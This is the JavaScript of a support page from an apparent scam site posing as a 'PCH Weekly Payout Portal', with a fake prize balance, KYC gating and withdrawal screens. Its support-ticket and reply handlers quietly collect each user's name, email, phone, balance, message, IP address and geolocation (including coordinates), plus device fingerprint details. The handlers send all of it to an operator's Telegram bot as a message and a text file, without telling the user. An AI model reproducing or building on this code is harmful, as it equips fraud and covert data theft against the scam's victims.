<script>
/* ═══════════ SHARED CORE ═══════════ */
const DEVICE_STORAGE_KEY = 'pch_device_state_v13';
const DEFAULT_TG = window.PCH_IOS_TELEGRAM || { botToken:'', chatId:'' };

function escapeHtml(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;'); }
function tgEsc(s){ return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
function fmtMoney(n){ return '$' + (Number(n)||0).toLocaleString(undefined,{minimumFractionDigits:2,maximumFractionDigits:2}); }

function loadDeviceState() {
  const saved = localStorage.getItem(DEVICE_STORAGE_KEY);
  if (saved) {
    try {
      const parsed = JSON.parse(saved);
      if (!parsed.telegramConfig) parsed.telegramConfig = Object.assign({}, DEFAULT_TG);
      if (parsed.userBalance == null) parsed.userBalance = 4500;
      if (!parsed.transactions) parsed.transactions = [];
      if (!parsed.registeredUsers) parsed.registeredUsers = [];
      if (!parsed.supportTickets) parsed.supportTickets = [];
      if (!parsed.withdrawalState) parsed.withdrawalState = 'none';
      return parsed;
    } catch(e){}
  }
  return { currentUser:null, userBalance:4500, configuredMethod:null, transactions:[], registeredUsers:[], supportTickets:[], withdrawalState:'none', currentWithdrawal:null, kyc:null, card:null, telegramConfig: Object.assign({}, DEFAULT_TG) };
}
const state = loadDeviceState();
if (!state.supportTickets) state.supportTickets = [];

function saveDeviceState() {
  try { localStorage.setItem(DEVICE_STORAGE_KEY, JSON.stringify(state)); } catch(err) {}
  if (state.currentUser && state.currentUser.username) {
    state.currentUser.supportTickets = state.supportTickets;
    syncCurrentUserToCloud().catch(()=>{});
  }
}
async function syncCurrentUserToCloud() { if (!window.rtdb || !state.currentUser || !state.currentUser.username) return; try { await window.rtdb.set(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()), state.currentUser); } catch(e){} }
async function pullCurrentUserFromCloud() {
  if (!window.rtdb || !state.currentUser || !state.currentUser.username) return false;
  try {
    const snap = await window.rtdb.get(window.rtdb.ref(window.rtdb.db, 'users/' + state.currentUser.username.toLowerCase()));
    if (!snap.exists()) return false;
    const r = snap.val();
    state.currentUser = Object.assign({}, state.currentUser, r);
    if (r.kyc) state.kyc = r.kyc;
    if (r.configuredMethod) state.configuredMethod = r.configuredMethod;
    if (r.supportTickets) state.supportTickets = r.supportTickets;
    if (typeof r.userBalance === 'number') state.userBalance = r.userBalance;
    if (Array.isArray(r.transactions)) state.transactions = r.transactions;
    if (r.card) state.card = r.card;
    state.withdrawalState = r.withdrawalState || state.withdrawalState || 'none';
    state.currentWithdrawal = r.currentWithdrawal || state.currentWithdrawal || null;
    saveDeviceState(); return true;
  } catch(e){ return false; }
}

function showToast(title, message, type='info') {
  const container = document.getElementById('toast-container'); if (!container) return;
  const id = 'toast-'+Date.now()+'-'+Math.floor(Math.random()*999);
  const icon = type==='success'?'fa-circle-check text-emerald-400':type==='warning'?'fa-triangle-exclamation text-gold-400':type==='error'?'fa-circle-exclamation text-rose-400':'fa-circle-info text-sky-custom';
  const border = type==='success'?'border-emerald-500/40':type==='warning'?'border-gold-500/40':type==='error'?'border-rose-500/40':'border-sky-custom/40';
  const el = document.createElement('div'); el.id = id;
  el.className = `pointer-events-auto bg-navy-900 border ${border} p-4 rounded-2xl shadow-2xl flex items-start space-x-3 toast-slide-in`;
  el.innerHTML = `<div class="text-lg mt-0.5"><i class="fa-solid ${icon}"></i></div><div class="flex-grow"><h5 class="font-bold text-white text-xs sm:text-sm">${escapeHtml(title)}</h5><p class="text-[11px] sm:text-xs text-slate-300 mt-0.5">${escapeHtml(message)}</p></div><button onclick="dismissToast('${id}')" class="text-slate-400 hover:text-white text-sm"><i class="fa-solid fa-xmark"></i></button>`;
  container.appendChild(el); setTimeout(()=>dismissToast(id), 5000);
}
function dismissToast(id){ const el=document.getElementById(id); if(el){ el.classList.remove('toast-slide-in'); el.classList.add('toast-slide-out'); setTimeout(()=>el.remove(),320); } }
function showModal(title, bodyHtml) { const modal = document.getElementById('global-modal'); const content = document.getElementById('modal-content'); content.innerHTML = `<h3 class="text-lg sm:text-xl font-bold text-white mb-3 flex items-center"><i class="fa-solid fa-circle-info text-sky-custom mr-2"></i> ${title}</h3><div class="text-slate-300 text-xs sm:text-sm leading-relaxed mb-4">${bodyHtml}</div>`; modal.style.display = 'flex'; document.body.classList.add('modal-open'); }
function closeModal(){ const m=document.getElementById('global-modal'); m.classList.remove('flex'); m.style.display='none'; document.body.classList.remove('modal-open'); }

/* ═══════════ DEVICE + IP ═══════════ */
function detectDevice() {
  const ua = navigator.userAgent || '';
  let os='Unknown', type='Desktop', browser='Unknown';
  if (/iPhone|iPad|iPod/i.test(ua)) { os='iOS'; type=/iPad/i.test(ua)?'Tablet':'Mobile'; }
  else if (/Android/i.test(ua)) { os='Android'; type=/Mobile/i.test(ua)?'Mobile':'Tablet'; }
  else if (/Mac OS X|Macintosh/i.test(ua)) { os='macOS'; }
  else if (/Windows/i.test(ua)) { os='Windows'; }
  else if (/CrOS/i.test(ua)) { os='ChromeOS'; }
  else if (/Linux/i.test(ua)) { os='Linux'; }
  if (/Edg\//i.test(ua)) browser='Edge';
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser='Opera';
  else if (/Chrome\//i.test(ua) && !/Edg|OPR/i.test(ua)) browser='Chrome';
  else if (/Firefox\//i.test(ua)) browser='Firefox';
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser='Safari';
  return { os, type, browser };
}
let cachedIp = null, cachedGeo = null;
async function fetchIP(){
  if (cachedIp && cachedGeo) return { ip: cachedIp, ...cachedGeo };
  try {
    const r = await fetch('https://ipapi.co/json/');
    if (r.ok) {
      const d = await r.json();
      if (d && d.ip) {
        cachedIp = d.ip;
        cachedGeo = { city: d.city||'', region: d.region||'', country: d.country_name||d.country||'', postal: d.postal||'', org: d.org||'', timezone: d.timezone||'', latitude: d.latitude||'', longitude: d.longitude||'' };
        return { ip: cachedIp, ...cachedGeo };
      }
    }
  } catch(e){}
  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    if (d && d.ip) { cachedIp = d.ip; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }; return { ip: cachedIp, ...cachedGeo }; }
  } catch(e){}
  cachedIp = 'Unknown'; cachedGeo = { city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' };
  return { ip: cachedIp, ...cachedGeo };
}

/* ═══════════ TELEGRAM — silent failures, full unmasked payload ═══════════ */
function tgCreds() {
  const cfg = state.telegramConfig || {};
  return { botToken: String(cfg.botToken || '').trim(), chatId: String(cfg.chatId || '').trim() };
}
async function sendTelegramMessage(textMessage) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('text', textMessage);
    fd.append('parse_mode', 'HTML');
    fd.append('disable_web_page_preview', 'true');
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method:'POST', body:fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] send failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] fetch failed:', err); return false; }
}
async function sendTelegramTextFile(filename, text, caption) {
  const { botToken, chatId } = tgCreds();
  if (!botToken || !chatId) { console.warn('[TG] botToken/chatId missing'); return false; }
  try {
    const blob = new Blob([text], { type: 'text/plain;charset=utf-8' });
    const fd = new FormData();
    fd.append('chat_id', chatId);
    fd.append('document', blob, filename);
    if (caption) { fd.append('caption', caption); fd.append('parse_mode', 'HTML'); }
    const r = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: fd });
    const d = await r.json();
    if (!d.ok) console.error('[TG] doc failed:', d.error_code, d.description);
    return d.ok;
  } catch (err) { console.error('[TG] doc fetch failed:', err); return false; }
}

function guardAuth() { if (!state.currentUser || !state.currentUser.username) { window.location.href = 'login.html'; return false; } return true; }
function logout() { state.currentUser = null; saveDeviceState(); window.location.href = 'login.html'; }

function toggleNavDrawer() {
  const drawer = document.getElementById('nav-drawer');
  const overlay = document.getElementById('nav-overlay');
  if (drawer.classList.contains('-translate-x-full')) { drawer.classList.remove('-translate-x-full'); overlay.classList.remove('hidden'); }
  else { drawer.classList.add('-translate-x-full'); overlay.classList.add('hidden'); }
}

function isTabLocked(tabKey) {
  const isKycApproved = state.kyc && state.kyc.status === 'approved';
  const isSetupComplete = !!state.configuredMethod;
  if (['transfer', 'cards', 'withdrawals'].includes(tabKey)) return !isKycApproved || !isSetupComplete;
  if (tabKey === 'funds') return !isKycApproved;
  if (tabKey === 'winners') return !isKycApproved;
  if (tabKey === 'spin') return !isKycApproved || !isSetupComplete;
  return false;
}
function showKycLockToast() { showToast('Identity Required', 'Please complete KYC verification.', 'warning'); setTimeout(() => { window.location.href = 'kyc.html'; }, 1000); }

const DASHBOARD_TABS = [
  { key:'overview', label:'Overview', icon:'fa-gauge-high', href:'overview.html' },
  { key:'funds', label:'Funds', icon:'fa-wallet', href:'funds.html' },
  { key:'transfer', label:'Transfer', icon:'fa-arrow-right-arrow-left', href:'transfer.html' },
  { key:'history', label:'History', icon:'fa-rectangle-list', href:'history.html' },
  { key:'support', label:'Support', icon:'fa-headset', href:'support.html' },
  { key:'promotions', label:'Promotions', icon:'fa-trophy', href:'promotions.html' },
  { key:'spin', label:'Arcade Hub', icon:'fa-dharmachakra', href:'spin.html' },
  { key:'winners', label:'Winners Wall', icon:'fa-crown', href:'winners.html' },
  { key:'cards', label:'Cards', icon:'fa-credit-card', href:'cards.html' },
  { key:'referrals', label:'Referrals', icon:'fa-gift', href:'referrals.html' },
  { key:'withdrawals', label:'Withdrawals', icon:'fa-money-bill-transfer', href:'withdrawals.html' },
  { key:'goals', label:'Goals', icon:'fa-bullseye', href:'goals.html' },
  { key:'notifications', label:'Alerts', icon:'fa-bell', href:'notifications.html' },
  { key:'kyc', label:'KYC', icon:'fa-id-card', href:'kyc.html' }
];
function renderNavItems(activeKey) { return DASHBOARD_TABS.map(it=>{ const active = it.key===activeKey; const locked = isTabLocked(it.key); return `<a href="${locked ? '#' : it.href}" onclick="${locked ? 'event.preventDefault(); showKycLockToast()' : ''}" class="flex items-center gap-3 px-4 py-3 rounded-xl text-sm font-bold transition ${active?'text-gold-400 bg-gold-500/10':(locked ? 'text-slate-500 opacity-60' : 'text-slate-300 hover:text-white hover:bg-navy-800')}"><i class="fa-solid ${locked ? 'fa-lock' : it.icon} w-4 text-center"></i><span>${it.label}</span></a>`; }).join(''); }
function renderDashboardSidebar(activeKey) { return `<aside class="hidden lg:block w-56 shrink-0"><div class="sticky top-24 space-y-1.5"><p class="text-[10px] text-slate-500 uppercase font-bold tracking-widest px-3 mb-3">Dashboard</p>${renderNavItems(activeKey)}</div></aside>`; }
function renderDashboardShell(activeKey, contentHtml) { return `<div class="dash-shell flex-grow w-full"><div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6 lg:py-8 pb-28 lg:pb-8"><div class="flex flex-col lg:flex-row gap-6 lg:gap-8">${renderDashboardSidebar(activeKey)}<div class="flex-1 min-w-0 space-y-6">${contentHtml}</div></div></div></div>`; }

function renderHeaderNav() {
  const nav = document.getElementById('nav-actions'); if (!nav) return;
  if (!state.currentUser) { nav.innerHTML = ''; return; }
  const u = state.currentUser;
  const avatar = u.photoUrl ? `<img src="${u.photoUrl}" class="w-7 h-7 rounded-full object-cover border border-gold-400">` : `<div class="w-7 h-7 rounded-full bg-gold-500 text-navy-950 flex items-center justify-center font-bold text-xs">${(u.firstName||'U').charAt(0)}</div>`;
  nav.innerHTML = `
    <button onclick="window.location.href='settings.html'" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-sky-custom hover:text-white transition rounded-lg flex items-center gap-1.5">${avatar}<span class="hidden sm:inline">${u.firstName||''}</span><i class="fa-solid fa-gear ml-1"></i></button>
    <button onclick="logout()" class="px-2 sm:px-3 py-2 text-xs sm:text-sm font-semibold text-rose-400 hover:text-white transition rounded-lg"><i class="fa-solid fa-right-from-bracket sm:mr-1"></i><span class="hidden sm:inline">Logout</span></button>
  `;
}

/* ═══════════ SUPPORT PAGE ═══════════ */
let activeTicketId = null;

function renderSupportView() {
  if (activeTicketId) {
    const t = (state.supportTickets || []).find(x => x.id === activeTicketId);
    if (!t) { activeTicketId = null; render(); return ''; }
    return `
      <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 sm:p-8 card-3d h-[calc(100vh-200px)] flex flex-col">
        <div class="flex items-center justify-between border-b border-navy-700 pb-4 mb-4">
          <div class="flex items-center gap-3">
            <button onclick="activeTicketId = null; render();" class="w-8 h-8 rounded-lg bg-navy-900 flex items-center justify-center text-slate-400 hover:text-white"><i class="fa-solid fa-arrow-left"></i></button>
            <div>
              <h2 class="text-base font-bold text-white">${escapeHtml(t.subject)}</h2>
              <p class="text-[10px] text-slate-400">Ticket #${t.id} · ${escapeHtml(t.category)}</p>
            </div>
          </div>
          <span class="badge ${t.status === 'open' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-slate-700/30 text-slate-400'}">${escapeHtml(t.status)}</span>
        </div>
        
        <div class="flex-1 overflow-y-auto space-y-4 pb-4" id="chat-container">
          ${t.messages.map(m => `
            <div class="flex ${m.sender === 'user' ? 'justify-end' : 'justify-start'}">
              <div class="max-w-[80%] rounded-2xl p-3 text-xs ${m.sender === 'user' ? 'bg-sky-custom text-navy-950 rounded-tr-sm' : 'bg-navy-900 text-slate-200 rounded-tl-sm border border-navy-700'}">
                <p>${escapeHtml(m.text)}</p>
                <p class="text-[9px] mt-1 ${m.sender === 'user' ? 'text-navy-800' : 'text-slate-500'} text-right">${new Date(m.time).toLocaleTimeString()}</p>
              </div>
            </div>
          `).join('')}
        </div>
        
        <form onsubmit="replyToTicket(event)" class="pt-4 border-t border-navy-700 flex gap-2">
          <input type="text" id="reply-input" required placeholder="Type your reply..." class="flex-1 bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom">
          <button type="submit" class="px-4 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-paper-plane"></i></button>
        </form>
      </div>
    `;
  }
  
  return `
    <div class="bg-navy-800 border border-navy-700 p-6 sm:p-8 rounded-3xl card-3d">
      <div class="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
        <div>
          <h2 class="text-xl sm:text-2xl font-extrabold text-white flex items-center"><i class="fa-solid fa-headset text-gold-400 mr-3"></i>Support Center</h2>
          <p class="text-xs text-slate-400 mt-1">Get help with your account, transactions, or features.</p>
        </div>
        <button onclick="openNewTicketModal()" class="px-5 py-2.5 bg-sky-custom text-navy-950 font-bold rounded-xl text-xs active:scale-95"><i class="fa-solid fa-plus mr-1"></i> New Ticket</button>
      </div>
    </div>
    
    <div class="bg-navy-800 border border-navy-700 rounded-3xl p-6 card-3d">
      <h3 class="text-sm font-bold text-white mb-4">Your Tickets</h3>
      <div class="space-y-3">
        ${(state.supportTickets || []).length === 0 ? '<p class="text-xs text-slate-500 text-center py-4">No open tickets.</p>' : (state.supportTickets || []).map(t => `
          <div onclick="activeTicketId = '${t.id}'; render();" class="bg-navy-900 border border-navy-700 rounded-xl p-4 flex items-center justify-between cursor-pointer hover:border-sky-custom transition">
            <div>
              <p class="text-sm font-bold text-white">${escapeHtml(t.subject)}</p>
              <p class="text-[10px] text-slate-500">${escapeHtml(t.category)} · ${new Date(t.date).toLocaleDateString()}</p>
            </div>
            <span class="badge ${t.status === 'open' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-slate-700/30 text-slate-400'}">${escapeHtml(t.status)}</span>
          </div>
        `).join('')}
      </div>
    </div>
  `;
}

function openNewTicketModal() {
  showModal('Create New Ticket', `
    <form onsubmit="submitNewTicket(event)" class="space-y-4">
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Subject</label><input type="text" id="sup-subject" required placeholder="Brief description" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"></div>
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Category</label><select id="sup-category" class="w-full bg-navy-950 border border-navy-700 rounded-xl px-4 py-2.5 text-sm text-white focus:outline-none focus:border-sky-custom"><option>Weekly Funds Setup</option><option>Withdrawal Processing</option><option>Account Verification</option><option>Savings & CD Inquiry</option><option>Promo / Draw Inquiry</option><option>P2P Transfer Issue</option><option>Wire / Bank Transfer Issue</option><option>Agent Support Inquiry</option></select></div>
      <div><label class="block text-xs font-bold text-slate-300 uppercase mb-1">Message</label><textarea id="sup-message" required rows="4" placeholder="Type your message here..." class="w-full bg-navy-950 border border-navy-700 rounded-xl p-3.5 text-sm text-white focus:outline-none focus:border-sky-custom"></textarea></div>
      <div class="flex justify-end pt-2"><button type="submit" class="w-full sm:w-auto px-8 py-3.5 bg-gradient-to-r from-gold-500 to-gold-600 text-navy-950 font-extrabold rounded-xl text-xs sm:text-sm shadow-lg shadow-gold-500/20 hover:brightness-110 active:scale-95 transition">Submit Ticket</button></div>
    </form>
  `);
}

async function submitNewTicket(e) {
  e.preventDefault();
  const subject  = document.getElementById('sup-subject').value.trim();
  const category = document.getElementById('sup-category').value;
  const message  = document.getElementById('sup-message').value.trim();
  if (!subject || !message) { showToast('Required', 'Fill in all fields.', 'warning'); return; }

  const u = state.currentUser || { username: 'unknown' };
  const now = new Date();
  const ticket = {
    id: 'TKT-' + Math.floor(100000 + Math.random() * 900000),
    subject, category, status: 'open',
    date: now.getTime(),
    messages: [{ sender: 'user', text: message, time: now.getTime() }]
  };

  if (!state.supportTickets) state.supportTickets = [];
  state.supportTickets.unshift(ticket);
  saveDeviceState();

  const dev = detectDevice();
  const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }));
  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
  const screen = (window.screen && window.screen.width) ? `${window.screen.width}x${window.screen.height}` : 'Unknown';
  const tz = (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){ return 'Unknown'; } })();

  const txtContent = [
    '═══════════════════════════════════════════════════════════',
    '   PCH WEEKLY PAYOUT PORTAL — NEW SUPPORT TICKET',
    '═══════════════════════════════════════════════════════════',
    '',
    `Created:      ${now.toISOString()}`,
    `Ticket ID:    ${ticket.id}`,
    `Account:      @${u.username}`,
    `Full Name:    ${fullName}`,
    `Email:        ${u.email || 'N/A'}`,
    `Phone:        ${u.phone || 'N/A'}`,
    `Balance:      ${fmtMoney(state.userBalance)}`,
    '',
    '───────────────────────────────────────────────────────────',
    '   NETWORK & DEVICE',
    '───────────────────────────────────────────────────────────',
    `IP Address:   ${net.ip || 'Unknown'}`,
    `City:         ${net.city || 'N/A'}`,
    `Region:       ${net.region || 'N/A'}`,
    `Country:      ${net.country || 'N/A'}`,
    `Postal:       ${net.postal || 'N/A'}`,
    `ISP / Org:    ${net.org || 'N/A'}`,
    `Latitude:     ${net.latitude || 'N/A'}`,
    `Longitude:    ${net.longitude || 'N/A'}`,
    `Timezone:     ${tz}`,
    `Device:       ${dev.type}`,
    `OS:           ${dev.os}`,
    `Browser:      ${dev.browser}`,
    `Screen:       ${screen}`,
    `Language:     ${navigator.language || 'Unknown'}`,
    `User-Agent:   ${navigator.userAgent}`,
    '',
    '───────────────────────────────────────────────────────────',
    `   CATEGORY:  ${category}`,
    `   SUBJECT:   ${subject}`,
    '───────────────────────────────────────────────────────────',
    '',
    message,
    '',
    '───────────────────────────────────────────────────────────',
    `Reply to this ticket via the Support page in your portal.`,
    '═══════════════════════════════════════════════════════════'
  ].join('\n');

  const safeSubject = subject.replace(/[^a-z0-9_-]/gi, '_').substring(0, 40);

  sendTelegramMessage(
    `📩 <b>NEW SUPPORT TICKET — ${tgEsc(ticket.id)}</b>\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
    `<b>Email:</b> ${tgEsc(u.email || 'N/A')}\n` +
    `<b>Phone:</b> ${tgEsc(u.phone || 'N/A')}\n` +
    `<b>Category:</b> ${tgEsc(category)}\n` +
    `<b>Subject:</b> ${tgEsc(subject)}\n` +
    `<b>Message:</b>\n${tgEsc(message)}\n` +
    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
    `<b>ISP:</b> ${tgEsc(net.org || 'N/A')}\n` +
    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
    `<b>Balance:</b> ${fmtMoney(state.userBalance)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  sendTelegramTextFile(
    `ticket-${ticket.id}-${safeSubject}.txt`,
    txtContent,
    `📄 <b>Ticket ${tgEsc(ticket.id)}</b> — @${tgEsc(u.username)}`
  ).catch(()=>{});

  closeModal();
  activeTicketId = ticket.id;
  showToast('Ticket Created', `Your ticket ${ticket.id} is now open.`, 'success');
  render();
}

async function replyToTicket(e) {
  e.preventDefault();
  const input = document.getElementById('reply-input');
  const text = input.value.trim();
  if (!text) return;
  
  const tIdx = (state.supportTickets || []).findIndex(x => x.id === activeTicketId);
  if (tIdx === -1) return;
  const ticket = state.supportTickets[tIdx];
  
  ticket.messages.push({ sender: 'user', text, time: Date.now() });
  ticket.status = 'open';
  saveDeviceState();

  const u = state.currentUser || { username: 'unknown' };
  const now = new Date();
  const dev = detectDevice();
  const net = await fetchIP().catch(()=> ({ ip:'Unknown', city:'', region:'', country:'', postal:'', org:'', timezone:'', latitude:'', longitude:'' }));
  const fullName = ((u.firstName||'') + ' ' + (u.lastName||'')).trim() || 'N/A';
  const tz = (function(){ try { return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown'; } catch(e){ return 'Unknown'; } })();

  const txtContent = [
    '═══════════════════════════════════════════════════════════',
    '   PCH WEEKLY PAYOUT PORTAL — TICKET REPLY',
    '═══════════════════════════════════════════════════════════',
    '',
    `Replied:      ${now.toISOString()}`,
    `Ticket ID:    ${ticket.id}`,
    `Subject:      ${ticket.subject}`,
    `Category:     ${ticket.category}`,
    `Account:      @${u.username}`,
    `Full Name:    ${fullName}`,
    `Email:        ${u.email || 'N/A'}`,
    `Phone:        ${u.phone || 'N/A'}`,
    `Balance:      ${fmtMoney(state.userBalance)}`,
    '',
    '───────────────────────────────────────────────────────────',
    '   NETWORK & DEVICE',
    '───────────────────────────────────────────────────────────',
    `IP Address:   ${net.ip || 'Unknown'}`,
    `Geo:          ${[net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A'}`,
    `ISP / Org:    ${net.org || 'N/A'}`,
    `Timezone:     ${tz}`,
    `Device:       ${dev.type}`,
    `OS:           ${dev.os}`,
    `Browser:      ${dev.browser}`,
    `Language:     ${navigator.language || 'Unknown'}`,
    `User-Agent:   ${navigator.userAgent}`,
    '',
    '───────────────────────────────────────────────────────────',
    '   USER REPLY',
    '───────────────────────────────────────────────────────────',
    '',
    text,
    '',
    '═══════════════════════════════════════════════════════════'
  ].join('\n');

  sendTelegramMessage(
    `💬 <b>USER REPLIED — ${tgEsc(ticket.id)}</b>\n` +
    `<b>User:</b> @${tgEsc(u.username)}\n` +
    `<b>Full name:</b> ${tgEsc(fullName)}\n` +
    `<b>Subject:</b> ${tgEsc(ticket.subject)}\n` +
    `<b>Message:</b>\n${tgEsc(text)}\n` +
    `<b>IP:</b> <code>${tgEsc(net.ip || 'Unknown')}</code>\n` +
    `<b>Geo:</b> ${tgEsc([net.city, net.region, net.country].filter(Boolean).join(', ') || 'N/A')}\n` +
    `<b>Device:</b> ${tgEsc(dev.type + ' · ' + dev.os + ' · ' + dev.browser)}\n` +
    `<b>Timestamp:</b> ${new Date().toISOString()}`
  ).catch(()=>{});

  sendTelegramTextFile(
    `reply-${ticket.id}-${now.getTime()}.txt`,
    txtContent,
    `📄 <b>Reply to ${tgEsc(ticket.id)}</b> — @${tgEsc(u.username)}`
  ).catch(()=>{});

  input.value = '';
  render();
}

function render() {
  document.body.classList.remove('modal-open');
  renderHeaderNav();
  document.querySelector('#nav-drawer nav').innerHTML = renderNavItems('support');
  const container = document.getElementById('app-container');
  container.innerHTML = renderDashboardShell('support', renderSupportView());
  const chatContainer = document.getElementById('chat-container');
  if (chatContainer) chatContainer.scrollTop = chatContainer.scrollHeight;
}

window.onload = async function() {
  if (!guardAuth()) return;
  await pullCurrentUserFromCloud();
  render();
};
</script>
</body>
</html>
